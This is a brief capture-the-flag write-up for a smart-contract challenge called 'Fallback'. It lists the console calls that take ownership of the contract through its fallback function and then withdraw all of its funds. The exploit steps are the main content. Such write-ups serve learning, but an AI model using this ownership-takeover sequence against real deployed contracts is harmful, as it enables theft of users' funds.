# Fallback

In this challenge we must utalize the contribute function (to fulfill a later requirement), then the fallback function(w/ sendTransaction) and finally as the new owner, we can withdraw all money from the contract.

```contract.contribute({value:1})```

```contract.sendTransaction({value:1})```

```contract.owner()```

```contract.withdraw()```
